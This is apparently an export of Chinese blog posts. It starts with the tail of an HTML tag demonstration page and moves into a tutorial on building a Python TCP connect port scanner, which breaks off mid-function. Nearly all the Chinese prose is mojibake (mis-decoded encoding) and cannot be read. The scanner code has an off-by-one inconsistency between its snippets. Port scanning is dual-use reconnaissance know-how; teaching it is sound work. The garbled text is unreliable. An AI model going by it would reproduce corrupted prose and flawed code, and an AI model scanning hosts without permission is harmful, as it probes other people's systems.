<p><strong>&lt;keygen&gt;</strong> å®šä¹‰ç”Ÿæˆç§˜é’¥<keygen name=""></p><br><hr><br><p><strong>&lt;output&gt;</strong> å®šä¹‰å¤šè¡Œçš„æ–‡æœ¬è¾“å…¥æ§ä»¶<output name="x" for="a b"></output></p><br><hr><br><p><strong>&lt;label&gt;</strong> å®šä¹‰ input å…ƒç´ çš„æ ‡æ³¨<input id="testid_1" name="" type="checkbox" value="1"><label for="testid_1">ç‚¹å‡»è¿™é‡Œä¹Ÿå¯ä»¥é€‰ä¸­</label></p><br><hr><br><p><strong>&lt;textarea&gt;</strong> å®šä¹‰å¤šè¡Œçš„æ–‡æœ¬è¾“å…¥æ§ä»¶</p><br><p><textarea></textarea></p><br><hr><br><p><strong>&lt;button&gt;</strong> å®šä¹‰æŒ‰é’®<small>ï¼ˆä¸ input ä¸åŒçš„æ˜¯ï¼Œbutton å†…éƒ¨å¯ä»¥æ”¾ç½®æ›´å¤šçš„å†…å®¹ï¼Œæ¯”å¦‚æ–‡æœ¬æˆ–å›¾åƒï¼‰</small></p><br><p><br>  <button type="button">æ™®é€šæŒ‰é’®</button><br>  <button type="reset">é‡ç½®æŒ‰é’®</button><br>  <button type="submit">æäº¤æŒ‰é’®</button><br></p><br></form><br><hr><br><h2>ã€æ ¼å¼ã€‘</h2><br><br><p><strong>&lt;blockquote&gt;</strong> å®šä¹‰é•¿çš„å¼•ç”¨<small>ï¼ˆé€šå¸¸å››å‘¨ä¼šæœ‰ç¼©è¿›ï¼‰</small></p><br><blockquote>WEBæ ‡å‡†ä¸æ˜¯æŸä¸€ä¸ªæ ‡å‡†ï¼Œè€Œæ˜¯ä¸€ç³»åˆ—æ ‡å‡†çš„é›†åˆã€‚ç½‘é¡µä¸»è¦ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼šç»“æ„ï¼ˆStructureï¼‰ã€è¡¨ç°ï¼ˆPresentationï¼‰å’Œè¡Œä¸ºï¼ˆBehaviorï¼‰ã€‚å¯¹åº”çš„æ ‡å‡†ä¹Ÿåˆ†ä¸‰æ–¹é¢ï¼šç»“æ„åŒ–æ ‡å‡†è¯­è¨€ä¸»è¦åŒ…æ‹¬XHTMLå’ŒXMLï¼Œè¡¨ç°æ ‡å‡†è¯­è¨€ä¸»è¦åŒ…æ‹¬CSSï¼Œè¡Œä¸ºæ ‡å‡†ä¸»è¦åŒ…æ‹¬å¯¹è±¡æ¨¡å‹ï¼ˆå¦‚W3C DOMï¼‰ã€ECMAScriptç­‰ã€‚è¿™äº›æ ‡å‡†å¤§éƒ¨åˆ†ç”±W3Cèµ·è‰å’Œå‘å¸ƒï¼Œä¹Ÿæœ‰ä¸€äº›æ˜¯å…¶ä»–æ ‡å‡†ç»„ç»‡åˆ¶è®¢çš„æ ‡å‡†ï¼Œæ¯”å¦‚ECMAï¼ˆEuropean Computer Manufacturers Associationï¼‰çš„ECMAScriptæ ‡å‡†ã€‚<br></blockquote><br><hr><br><p><strong>&lt;pre&gt;</strong> å®šä¹‰é¢„æ ¼å¼æ–‡æœ¬<small>ï¼ˆé€šå¸¸ä¼š<strong>ä¿ç•™ç©ºæ ¼åŠæ¢è¡Œç¬¦</strong>ï¼Œå¹¶ä½¿ç”¨ç­‰å®½å­—ä½“æ˜¾ç¤ºï¼Œå¾ˆé€‚åˆç”¨æ¥è¡¨ç¤ºè®¡ç®—æœºä»£ç ï¼‰</small></p><br><pre><br>for(var i=0; i<9; i++)="" {="" i++;="" };="" <="" pre=""><br></9;></pre><br><hr><br><p><strong>&lt;address&gt;</strong>å®šä¹‰æ–‡æ¡£ä½œè€…æˆ–æ‹¥æœ‰è€…çš„è”ç³»ä¿¡æ¯<small>ï¼ˆé€šå¸¸ä½¿ç”¨æ–œä½“æ˜¾ç¤ºï¼‰</small></p><br><address><br>  <a href="mailto:joy_nick@qq.com" target="_blank" rel="external">è”ç³»æˆ‘</a><br>å‰ç«¯å¼€å‘<br></address><br><hr><br><p><strong>&lt;a&gt;</strong> å®šä¹‰<a href="http://byd.dropsec.xyz/">é“¾æ¥</a></p><br><p><strong>&lt;em&gt;</strong> å®šä¹‰<em>å¼ºè°ƒæ–‡æœ¬</em><small>ï¼ˆé€šå¸¸ä½¿ç”¨æ–œä½“æ˜¾ç¤ºï¼‰</small></p><br><p><strong>&lt;strong&gt;</strong> å®šä¹‰<strong>æ›´ä¸ºå¼ºè°ƒçš„æ–‡æœ¬</strong><small>ï¼ˆé€šå¸¸ä½¿ç”¨ç²—ä½“æ˜¾ç¤ºï¼‰</small></p><br><p><strong>&lt;mark&gt;</strong> å®šä¹‰<mark>å¸¦æœ‰æ ‡è®°çš„æ–‡æœ¬</mark><small>ï¼ˆé€šå¸¸ä¼šé«˜äº®æ˜¾ç¤ºï¼‰</small></p><br><p><strong>&lt;time&gt;</strong> å®šä¹‰<time datetime="2016-6-6">æ—¶é—´</time><small>ï¼ˆé€šå¸¸ä¸ä¼šæœ‰ä»»ä½•è§†è§‰æ•ˆæœï¼‰</small></p><br><hr><br><p><strong>&lt;del&gt;</strong> å®šä¹‰<del>è¢«åˆ é™¤æ–‡æœ¬</del><small>ï¼ˆé€šå¸¸å¸¦æœ‰åˆ é™¤çº¿ï¼‰</small></p><br><p><strong>&lt;ins&gt;</strong> å®šä¹‰<ins>æ–°æ’å…¥æ–‡æœ¬</ins><small>ï¼ˆé€šå¸¸å¸¦æœ‰ä¸‹åˆ’çº¿ï¼‰</small></p><br><p>2016å¹´6æœˆ6æ—¥æ˜¯<del>æ˜ŸæœŸäº”</del><ins>æ˜ŸæœŸå››</ins></p><br><hr><br><p><strong>&lt;i&gt;</strong> å®šä¹‰<i>æ–œä½“æ–‡æœ¬</i></p><br><p><strong>&lt;b&gt;</strong> å®šä¹‰<b>ç²—ä½“æ–‡æœ¬</b></p><br><p><strong>&lt;big&gt;</strong> å®šä¹‰<big>å¤§å·æ–‡æœ¬</big><small>ï¼ˆé€šå¸¸ä½¿ç”¨æ¯”æ­£æ–‡æ›´å¤§çš„å­—å·æ˜¾ç¤ºï¼‰</small></p><br><p><strong>&lt;small&gt;</strong> å®šä¹‰<small>å°å·æ–‡æœ¬</small><small>ï¼ˆé€šå¸¸ä½¿ç”¨æ¯”æ­£æ–‡æ›´å°çš„å­—å·æ˜¾ç¤ºï¼‰</small></p><br><p><strong>&lt;sup&gt;</strong> å®šä¹‰<sup>ä¸Šæ ‡æ–‡æœ¬</sup>ã€X<sup>2</sup></p><br><p><strong>&lt;sub&gt;</strong> å®šä¹‰<sub>ä¸‹æ ‡æ–‡æœ¬</sub>ã€H<sub>2</sub>O</p><br><hr><br><p><strong>&lt;code&gt;</strong> å®šä¹‰<code>è®¡ç®—æœºä»£ç æ–‡æœ¬ã€‚This HTML Code.</code><small>ï¼ˆé€šå¸¸ä½¿ç”¨ç­‰å®½å­—ä½“æ˜¾ç¤ºï¼Œä½†<strong>ä¸ä¼šä¿ç•™ç©ºæ ¼åŠæ¢è¡Œç¬¦</strong>ï¼Œéœ€è¦ä¿ç•™ç©ºæ ¼åŠæ¢è¡Œç¬¦ï¼Œè¯·ä½¿ç”¨&lt;pre&gt;ï¼‰</small><a href="http://www.w3school.com.cn/tags/tag_code.asp" target="_blank" rel="external">è¯¦ç»†æè¿°</a></p><br><p><strong>&lt;cite&gt;</strong> å®šä¹‰<cite>å¼•ç”¨ã€‚å¯ä½¿ç”¨è¯¥æ ‡ç­¾å¯¹å‚è€ƒæ–‡çŒ®çš„å¼•ç”¨è¿›è¡Œå®šä¹‰ï¼Œæ¯”å¦‚ä¹¦ç±æˆ–æ‚å¿—çš„æ ‡é¢˜ã€‚</cite><small>ï¼ˆé€šå¸¸ä½¿ç”¨æ–œä½“æ˜¾ç¤ºï¼‰</small><a href="http://www.w3school.com.cn/tags/tag_cite.asp" target="_blank" rel="external">è¯¦ç»†æè¿°</a></p><br><p><strong>&lt;q&gt;</strong> å®šä¹‰<q>çŸ­çš„å¼•ç”¨</q><small>ï¼ˆé€šå¸¸ä¼šåœ¨ä¸¤è¾¹åŠ åŒå¼•å·ï¼‰</small></p><br><hr><br><p><strong>&lt;bdo&gt;</strong> å®šä¹‰æ–‡æœ¬çš„æ–¹å‘</p><br><p>åé¢çš„æ–‡å­—ä¼šä»å³åˆ°å·¦æ¥æ˜¾ç¤ºï¼š<bdo dir="rtl">ä½ å·²ç»å…·å¤‡äº†å€’è¯»çš„èƒ½åŠ›</bdo></p><br><hr><br><p><strong>&lt;abbr&gt;</strong> å®šä¹‰ç¼©å†™</p><br><p>å¾®è½¯æ¨å‡ºçš„æµè§ˆå™¨æ˜¯ <abbr title="Internet Explorer">IE</abbr> æµè§ˆå™¨ã€‚ï¼ˆé¼ æ ‡ç§»åˆ°â€œIEâ€ä¸Šçœ‹æ•ˆæœï¼‰</p><br><hr><br><p><strong>&lt;progress&gt;</strong> å®šä¹‰è¿›åº¦æ¡ <progress value="22" max="100"></progress> </p><br><p><strong>&lt;meter&gt;</strong> å®šä¹‰åº¦è®¡é‡ <meter value="3" min="0" max="10">ååˆ†ä¹‹ä¸‰</meter> <meter value="0.6">60%</meter></p><br><hr><br><h2>ã€å›¾åƒã€‘</h2><br><br><p><strong>&lt;img&gt;</strong> å®šä¹‰å›¾åƒ</p><br><p><strong>&lt;map&gt;</strong> å®šä¹‰å¯ç‚¹å‡»åŒºåŸŸ</p><br><p><strong>&lt;area&gt;</strong> å®šä¹‰å¯ç‚¹å‡»åŒºåŸŸçš„å†…éƒ¨åŒºåŸŸ</p><br><p>å›¾ç‰‡å·¦å³ä¸¤è¾¹çš„é“¾æ¥ä¸ä¸€æ ·ï¼š</p><br><p><img src="http://oa8y5guqs.bkt.clouddn.com/27W58PICZS7_1024.jpg" usemap="#html"></p><br><!--
åœ†å½¢
shape="circle" coords="x,y,r"
x,y ä¸ºåæ ‡ï¼ˆ0,0æ˜¯å·¦ä¸Šè§’ï¼‰ï¼Œr ä¸ºåœ†çš„åŠå¾„

å¤šè¾¹å½¢
shape="polygon"ï¼Œcoords="x1,y1,x2,y2,x3,y3,..."
å¤šè¾¹å½¢ä¼šè‡ªåŠ¨å°é—­ï¼Œä¸éœ€è¦åœ¨ç»“å°¾é‡å¤ç¬¬ä¸€ä¸ªåæ ‡æ¥å…³é—­

çŸ©å½¢
shape="rectangle"ï¼Œcoords="x1,y1,x2,y2"
--><br><map name="html" id="html"><br>  <area shape="circle" coords="15,15,15" href="http://oa8y5guqs.bkt.clouddn.com/27W58PICZS7_1024.jpg" alt="Logo"><br>  <area shape="rectangle" coords="40,0,80,30" href="http://oa8y5guqs.bkt.clouddn.com/27W58PICZS7_1024.jpg" alt="F2E"><br></map><br><hr><br><p><strong>&lt;figure&gt;</strong> å®šä¹‰æ–‡æ¡£ä¸­çš„åª’ä½“å†…å®¹ï¼ˆå›¾ç‰‡ã€å›¾è¡¨ã€ç…§ç‰‡ã€ä»£ç ç­‰ï¼‰</p><br><p><strong>&lt;figcaption&gt;</strong> å®šä¹‰ figure å…ƒç´ çš„æ ‡é¢˜</p>

<p><figure><br>  <figcaption>åª’ä½“æ ‡é¢˜</figcaption><br>  <img src="http://oa8y5guqs.bkt.clouddn.com/27W58PICZS7_1024.jpg"><br></figure></p>
<p><hr></p>
<p></p><p><strong>&lt;canvas&gt;</strong> å®šä¹‰ç”»å¸ƒ<small>ï¼ˆæ­¤å¤„ä¸åšæ¼”ç¤ºï¼‰</small></p><p></p>
<p><hr></p>
<h2>ã€éŸ³é¢‘/è§†é¢‘ã€‘</h2>

<p></p><p><strong>&lt;audio&gt;</strong> å®šä¹‰å£°éŸ³</p><p></p>
<p></p><p><strong>&lt;source&gt;</strong> å®šä¹‰åª’ä½“æº</p><p></p>
<p><audio controls="controls"><br>æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒ audio æ ‡ç­¾<br></audio></p>
<p><hr></p>
<p></p><p><strong>&lt;audio&gt;</strong> å®šä¹‰è§†é¢‘</p><p></p>
<p></p><p><strong>&lt;video&gt;</strong> å®šä¹‰å­—å¹•</p><p></p>
<p><video controls="controls"><br>æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒ video æ ‡ç­¾<br></video></p>
<p><hr></p>
<h2>ã€å…¶ä»–ã€‘</h2>

<p></p><p><strong>&lt;noscript&gt;</strong> å®šä¹‰é’ˆå¯¹ä¸æ”¯æŒå®¢æˆ·ç«¯è„šæœ¬çš„ç”¨æˆ·çš„æ›¿ä»£å†…å®¹</p><p></p>
<p><script type="text/javascript"><br>document.write(â€œ<p>å½“å‰æ‚¨çš„æµè§ˆå™¨æ”¯æŒJavaScriptè„šæœ¬</p>â€œ)<br></script></p>
<noscript>è‹¥æ‚¨çœ‹åˆ°è¿™è¡Œå­—ï¼Œè¯´æ˜æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒJavaScriptè„šæœ¬</noscript>

<hr>

<p></p><p><strong>&lt;noframes&gt;</strong> å®šä¹‰é’ˆå¯¹ä¸æ”¯æŒæ¡†æ¶çš„ç”¨æˆ·çš„æ›¿ä»£å†…å®¹</p><p></p>
<p><noframes>è‹¥æ‚¨çœ‹åˆ°è¿™è¡Œå­—ï¼Œè¯´æ˜æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒè¿è¡Œæ¡†æ¶</noframes></p>
<p><hr></p>
<p></p><p><strong>&lt;ruby&gt;</strong> å®šä¹‰ ruby æ³¨é‡Š</p><p></p>
<p></p><p><strong>&lt;rt&gt;</strong> å®šä¹‰ ruby æ³¨é‡Šçš„è§£é‡Š</p><p></p>
<p></p><p><strong>&lt;rp&gt;</strong> å®šä¹‰è‹¥æµè§ˆå™¨ä¸æ”¯æŒ ruby å…ƒç´ æ˜¾ç¤ºçš„å†…å®¹</p><br><ruby><br>æ¼¢ <rt><rp>(</rp>ã„ã„¢Ë‹<rp>)</rp></rt><br></ruby><p></p>
]]></content>
      
        
        <tags>
            
            <tag> å‰ç«¯ </tag>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> HTML </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Pythonå®ç°ç«¯å£æ‰«æ]]></title>
      <url>/2016/08/24/Python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
      <content type="html"><![CDATA[<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><font color="#000FF">ç«¯å£æ‰«æå·¥å…·ï¼ˆPort Scannerï¼‰æŒ‡ç”¨äºæ¢æµ‹æœåŠ¡å™¨æˆ–ä¸»æœºå¼€æ”¾ç«¯å£æƒ…å†µçš„å·¥å…·ã€‚å¸¸è¢«è®¡ç®—æœºç®¡ç†å‘˜ç”¨äºç¡®è®¤å®‰å…¨ç­–ç•¥ï¼ŒåŒæ—¶è¢«æ”»å‡»è€…ç”¨äºè¯†åˆ«ç›®æ ‡ä¸»æœºä¸Šçš„å¯è¿ä½œçš„ç½‘ç»œæœåŠ¡ã€‚</font><br><a id="more"></a><br><font color="#000FF">ç«¯å£æ‰«æå®šä¹‰æ˜¯å®¢æˆ·ç«¯å‘ä¸€å®šèŒƒå›´çš„æœåŠ¡å™¨ç«¯å£å‘é€å¯¹åº”è¯·æ±‚ï¼Œä»¥æ­¤ç¡®è®¤å¯ä½¿ç”¨çš„ç«¯å£ã€‚è™½ç„¶å…¶æœ¬èº«å¹¶ä¸æ˜¯æ¶æ„çš„ç½‘ç»œæ´»åŠ¨ï¼Œä½†ä¹Ÿæ˜¯ç½‘ç»œæ”»å‡»è€…æ¢æµ‹ç›®æ ‡ä¸»æœºæœåŠ¡ï¼Œä»¥åˆ©ç”¨è¯¥æœåŠ¡çš„å·²çŸ¥æ¼æ´çš„é‡è¦æ‰‹æ®µã€‚ç«¯å£æ‰«æçš„ä¸»è¦ç”¨é€”ä»ç„¶åªæ˜¯ç¡®è®¤è¿œç¨‹æœºå™¨æŸä¸ªæœåŠ¡çš„å¯ç”¨æ€§ã€‚<br><br>æ‰«æå¤šä¸ªä¸»æœºä»¥è·å–ç‰¹å®šçš„æŸä¸ªç«¯å£è¢«ç§°ä¸ºç«¯å£æ¸…æ‰«ï¼ˆPortsweepï¼‰ï¼Œä»¥æ­¤è·å–ç‰¹å®šçš„æœåŠ¡ã€‚ä¾‹å¦‚ï¼ŒåŸºäºSQLæœåŠ¡çš„è®¡ç®—æœºè •è™«å°±ä¼šæ¸…æ‰«å¤§é‡ä¸»æœºçš„åŒä¸€ç«¯å£ä»¥åœ¨ 1433 ç«¯å£ä¸Šå»ºç«‹TCPè¿æ¥ã€‚</font>

<h1 id="å®ç°åŸç†"><a href="#å®ç°åŸç†" class="headerlink" title="å®ç°åŸç†"></a>å®ç°åŸç†</h1><font color="#000ff">æœ€ç®€å•çš„ç«¯å£æ‰«æå·¥å…·ä½¿ç”¨TCPè¿æ¥æ‰«æçš„æ–¹å¼ï¼Œå³åˆ©ç”¨æ“ä½œç³»ç»ŸåŸç”Ÿçš„ç½‘ç»œåŠŸèƒ½ï¼Œä¸”é€šå¸¸ä½œä¸ºSYNæ‰«æçš„æ›¿ä»£é€‰é¡¹ã€‚Nmapå°†è¿™ç§æ¨¡å¼ç§°ä¸ºè¿æ¥æ‰«æï¼Œå› ä¸ºä½¿ç”¨äº†ç±»ä¼¼Unixç³»ç»Ÿçš„connect()å‘½ä»¤ã€‚å¦‚æœè¯¥ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œæ“ä½œç³»ç»Ÿå°±èƒ½å®ŒæˆTCPä¸‰æ¬¡æ¡æ‰‹ï¼Œç„¶åç«¯å£æ‰«æå·¥å…·ä¼šç«‹å³å…³é—­åˆšå»ºç«‹çš„è¯¥è¿æ¥ï¼Œé˜²æ­¢æ‹’ç»æœåŠ¡æ”»å‡»ã€‚è¿™ç§æ‰«ææ¨¡å¼çš„ä¼˜åŠ¿æ˜¯ç”¨æˆ·æ— éœ€ç‰¹æ®Šæƒé™ã€‚ä½†ä½¿ç”¨æ“ä½œç³»ç»ŸåŸç”Ÿç½‘ç»œåŠŸèƒ½ä¸èƒ½å®ç°åº•å±‚æ§åˆ¶ï¼Œå› æ­¤è¿™ç§æ‰«ææ–¹å¼å¹¶ä¸æµè¡Œã€‚å¹¶ä¸”TCPæ‰«æå¾ˆå®¹æ˜“è¢«å‘ç°ï¼Œå°¤å…¶ä½œä¸ºç«¯å£æ¸…æ‰«çš„æ‰‹æ®µï¼šè¿™äº›æœåŠ¡ä¼šè®°å½•å‘é€è€…çš„IPåœ°å€ï¼Œå…¥ä¾µæ£€æµ‹ç³»ç»Ÿå¯èƒ½è§¦å‘è­¦æŠ¥ã€‚<br><br>è¿˜æœ‰å¦å¤–ä¸€ç§æ‰«ææ–¹å¼æ˜¯SYNæ‰«æï¼Œç«¯å£æ‰«æå·¥å…·ä¸ä½¿ç”¨æ“ä½œç³»ç»ŸåŸç”Ÿç½‘ç»œåŠŸèƒ½ï¼Œè€Œæ˜¯è‡ªè¡Œç”Ÿæˆã€å‘é€IPæ•°æ®åŒ…ï¼Œå¹¶ç›‘æ§å…¶å›åº”ã€‚è¿™ç§æ‰«ææ¨¡å¼è¢«ç§°ä¸ºâ€œåŠå¼€æ”¾æ‰«æâ€ï¼Œå› ä¸ºå®ƒä»ä¸å»ºç«‹å®Œæ•´çš„TCPè¿æ¥ã€‚ç«¯å£æ‰«æå·¥å…·ç”Ÿæˆä¸€ä¸ªSYNåŒ…ï¼Œå¦‚æœç›®æ ‡ç«¯å£å¼€æ”¾ï¼Œåˆ™ä¼šè¿”å›SYN-ACKåŒ…ã€‚æ‰«æç«¯å›åº”ä¸€ä¸ªRSTåŒ…ï¼Œç„¶ååœ¨æ¡æ‰‹å®Œæˆå‰å…³é—­è¿æ¥ã€‚å¦‚æœç«¯å£å…³é—­äº†ä½†æœªä½¿ç”¨è¿‡æ»¤ï¼Œç›®æ ‡ç«¯å£åº”è¯¥ä¼šæŒç»­è¿”å›RSTåŒ…ã€‚è¿™ç§ç²—ç•¥çš„ç½‘ç»œåˆ©ç”¨æ–¹å¼æœ‰å‡ ä¸ªä¼˜ç‚¹ï¼šç»™æ‰«æå·¥å…·å…¨æƒæ§åˆ¶æ•°æ®åŒ…å‘é€å’Œç­‰å¾…å›åº”æ—¶é•¿çš„æƒåŠ›ï¼Œå…è®¸æ›´è¯¦ç»†çš„å›åº”åˆ†æã€‚å…³äºå“ªä¸€ç§å¯¹ç›®æ ‡ä¸»æœºçš„æ‰«ææ–¹å¼æ›´ä¸å…·å¤‡å…¥ä¾µæ€§å­˜åœ¨ä¸€äº›äº‰è®®ï¼Œä½†SYNæ‰«æçš„ä¼˜åŠ¿æ˜¯ä»ä¸ä¼šå»ºç«‹å®Œæ•´çš„è¿æ¥ã€‚ç„¶è€Œï¼ŒRSTåŒ…å¯èƒ½å¯¼è‡´ç½‘ç»œå µå¡ï¼Œå°¤å…¶æ˜¯ä¸€äº›ç®€å•å¦‚æ‰“å°æœºä¹‹ç±»çš„ç½‘ç»œè®¾å¤‡ã€‚<br><br>æ­¤æ¬¡ä½¿ç”¨çš„æ˜¯ç¬¬ä¸€ç§æ‰«ææ–¹å¼ï¼Œç›´æ¥åˆ©ç”¨æ“ä½œç³»ç»Ÿçš„socketè¿æ¥æ¥å£ï¼Œåˆæ­¥æµ‹è¯•ç›®æ ‡æœåŠ¡å™¨çš„ç«¯å£æ˜¯å¦å¯ä»¥è¿æ¥ï¼Œå¦‚æœå¯ä»¥åˆ™è¿”å›ç«¯å£æ‰“å¼€çŠ¶æ€</font>

<h1 id="å®ç°æ­¥éª¤"><a href="#å®ç°æ­¥éª¤" class="headerlink" title="å®ç°æ­¥éª¤"></a>å®ç°æ­¥éª¤</h1><p>å¯ä»¥æŠŠç¨‹åºåˆ†æˆä¸‹é¢å‡ éƒ¨åˆ†ï¼š</p>
<pre><code>1.è¯»å–ç«¯å£åŠç›®æ ‡æœåŠ¡å™¨
2.æµ‹è¯•TCPç«¯å£è¿æ¥
3.è¾“å‡ºå¼€æ”¾ç«¯å£ç»“æœ
</code></pre><h3 id="1-è¯»å–ç«¯å£åŠç›®æ ‡æœåŠ¡å™¨"><a href="#1-è¯»å–ç«¯å£åŠç›®æ ‡æœåŠ¡å™¨" class="headerlink" title="1.è¯»å–ç«¯å£åŠç›®æ ‡æœåŠ¡å™¨"></a>1.è¯»å–ç«¯å£åŠç›®æ ‡æœåŠ¡å™¨</h3><font color="#000ff">ç›´æ¥æŠŠç›®æ ‡æœåŠ¡å™¨å’Œç«¯å£èŒƒå›´ä½œä¸ºå‚æ•°ä¼ ç»™æˆ‘ä»¬çš„ç¨‹åºï¼Œç¨‹åºè¿è¡Œå‚æ•°ï¼š</font>

<blockquote>
<p>python port_scan.py <host\> <start\_port>-<end\_port></end\_port></start\_port></host\></p>
</blockquote>
<p>ç¨‹åºä¸­ä½¿ç”¨sys.argv[]æ¥è¯»å–å¹¶åˆæ­¥å¤„ç†,å…·ä½“çš„è¯­æ³•è¯·å‚è€ƒ<a href="http://www.360doc.com/content/11/0530/12/54470_120450746.shtml" target="_blank" rel="external">python sys.argv[]ç”¨æ³•</a>ï¼š</p>
<pre><code>#!/usr/bin/python
# -*- coding: UTF-8 -*-
&apos;&apos;&apos;
@Authorï¼šjoy_nick
@åšå®¢ï¼šhttp://byd.dropsec.xyz/
&apos;&apos;&apos;
import sys

# portscan.py &lt;host&gt; &lt;start_port&gt;-&lt;end_port&gt;
host = sys.argv[1]
portstrs = sys.argv[2].split(&apos;-&apos;)

start_port = int(portstrs[0])
end_port = int(portstrs[1])
</code></pre><h3 id="2-æµ‹è¯•TCPç«¯å£è¿æ¥"><a href="#2-æµ‹è¯•TCPç«¯å£è¿æ¥" class="headerlink" title="2.æµ‹è¯•TCPç«¯å£è¿æ¥"></a>2.æµ‹è¯•TCPç«¯å£è¿æ¥</h3><p>æˆ‘ä»¬è¿›å…¥åˆ°ä¸€ä¸ªå¾ªç¯ï¼Œåœ¨è¿™ä¸ªå¾ªç¯ä¸­ä¾æ¬¡å¯¹ç«¯å£èŒƒå›´å†…çš„ç«¯å£è¿›è¡Œè¿æ¥æµ‹è¯•ã€‚</p>
<font color="#000ff">é¦–å…ˆè¦åœ¨æ–‡ä»¶å¼€å§‹éƒ¨åˆ†å¼•å…¥ socket åŒ…ï¼š</font>

<blockquote>
<p>from socket import *</p>
</blockquote>
<p>è¿æ¥æµ‹è¯•æ–¹æ³•æ˜¯ï¼š</p>
<pre><code>åˆ›å»ºsocket
è°ƒç”¨connect()å‡½æ•°
å…³é—­è¿æ¥
</code></pre><p>ä¾æ¬¡å®ç°å¦‚ä¸‹ï¼š</p>
<font color="#000ff">è·å–ç›®æ ‡IPåœ°å€ï¼š</font>

<blockquote>
<p>target_ip = gethostbyname(host)</p>
</blockquote>
<font color="#000ff">è¿›å…¥å¾ªç¯å¼€å§‹è¿æ¥ï¼š</font>

<pre><code>opened_ports = []

for port in range(start_port, end_port + 1):
    sock = socket(AF_INET, SOCK_STREAM)
    sock.settimeout(10)
    result = sock.connect_ex((target_ip, port))
    if result == 0:
        opened_ports.append(port)
</code></pre><p><strong>é™„ï¼š</strong></p>
<p>1.<a href="http://baike.baidu.com/link?url=t3aTQ0VIR87LP2zNAiDwYi7yrHfRJ_myvW_peE1GGidV0N_DId-8wVdn2yb_lICJupshiQl3ZHjgeL89imMN9K" target="_blank" rel="external">Python socket()ä»‹ç»åŠä½¿ç”¨æ–¹æ³•</a></p>
<p>2.<a href="http://blog.sina.com.cn/s/blog_523491650100hikg.html" target="_blank" rel="external">Python socketç¼–ç¨‹</a></p>
<h3 id="3-è¾“å‡ºå¼€æ”¾ç«¯å£ç»“æœ"><a href="#3-è¾“å‡ºå¼€æ”¾ç«¯å£ç»“æœ" class="headerlink" title="3.è¾“å‡ºå¼€æ”¾ç«¯å£ç»“æœ"></a>3.è¾“å‡ºå¼€æ”¾ç«¯å£ç»“æœ</h3><p>è¿™ä¸€æ­¥éª¤å¾ˆç®€å•ï¼Œåªéœ€è¦æ‰“å°opened_portsåˆ—è¡¨ï¼š</p>
<pre><code>print(&quot;Opened ports:&quot;)

for i in opened_ports:
    print(i)
</code></pre><p>å®Œæ•´çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code>#!/usr/bin/python
# -*- coding: utf-8 -*-
&apos;&apos;&apos;
@Authorï¼šjoy_nick
@åšå®¢ï¼šhttp://byd.dropsec.xyz/
&apos;&apos;&apos;
import sys
from socket import *

# port_scan.py &lt;host&gt; &lt;start_port&gt;-&lt;end_port&gt;
host = sys.argv[1]
portstrs = sys.argv[2].split(&apos;-&apos;)

start_port = int(portstrs[0])
end_port = int(portstrs[1])

target_ip = gethostbyname(host)
opened_ports = []

for port in range(start_port, end_port):
    sock = socket(AF_INET, SOCK_STREAM)
    sock.settimeout(10)
    result = sock.connect_ex((target_ip, port))
    if result == 0:
        opened_ports.append(port)

print(&quot;Opened ports:&quot;)

for i in opened_ports:
    print(i)
</code></pre><h1 id="æ‰§è¡Œæµ‹è¯•"><a href="#æ‰§è¡Œæµ‹è¯•" class="headerlink" title="æ‰§è¡Œæµ‹è¯•"></a>æ‰§è¡Œæµ‹è¯•</h1><p>å‘½ä»¤ä¸ºï¼š</p>
<blockquote>
<p>python port_scan.py 192.168.1.200 21-23</p>
</blockquote>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/port_scan1.png" alt=""></p>
<h1 id="å¤šçº¿ç¨‹ç«¯å£æ‰«æå™¨"><a href="#å¤šçº¿ç¨‹ç«¯å£æ‰«æå™¨" class="headerlink" title="å¤šçº¿ç¨‹ç«¯å£æ‰«æå™¨"></a>å¤šçº¿ç¨‹ç«¯å£æ‰«æå™¨</h1><p>ä¸Šé¢çš„ç®€å•ç¨‹åºä¸­ï¼Œæˆ‘ä»¬ä¾æ¬¡æµ‹è¯•æ¯ä¸ªç«¯å£ï¼Œå¦‚æœè¦æé«˜æ€§èƒ½ï¼Œå¯ä»¥è€ƒè™‘é‡‡ç”¨å¤šçº¿ç¨‹çš„æ–¹å¼ã€‚</p>
<p>æ”¹è¿›çš„æ–¹å¼å¦‚ä¸‹ï¼š</p>
<pre><code>1.æŠŠTCPè¿æ¥æµ‹è¯•å°è£…è¿›å‡½æ•°
2.æ¯æ¬¡å¾ªç¯éƒ½åˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ¥æ‰§è¡Œ1ä¸­çš„æ‰«æå‡½æ•°
3.ä¸ºäº†ç®€åŒ–å®ç°ï¼ŒæŠŠå¼€æ”¾ç«¯å£è¾“å‡ºæ­¥éª¤å†™å…¥åˆ°1çš„æµ‹è¯•å‡½æ•°ä¸­
</code></pre><font color="#000ff">é¦–å…ˆå¼•å…¥threadåŒ…ï¼Œè¿™ä¸ªåŒ…æ˜¯Pythonå¤šçº¿ç¨‹å®ç°éœ€è¦çš„ï¼š</font>

<blockquote>
<p>import thread</p>
</blockquote>
<p>å®ç°TCPæµ‹è¯•å‡½æ•°ï¼Œéœ€è¦æ³¨æ„printè¾“å‡ºæ—¶å€™éœ€è¦åŠ é”ï¼Œå¦‚æœä¸åŠ é”å¯èƒ½ä¼šå‡ºç°å¤šä¸ªè¾“å‡ºæ··åˆåœ¨ä¸€èµ·çš„é”™è¯¯çŠ¶æ€ï¼Œè€Œé”éœ€è¦åœ¨ç¨‹åºå¯åŠ¨æ—¶åˆ›å»ºï¼Œä»è€Œèƒ½è®©æ–°å»ºçš„çº¿ç¨‹å…±äº«è¿™ä¸ªé”ï¼š</p>
<pre><code>def tcp_test(port):
    sock = socket(AF_INET, SOCK_STREAM)
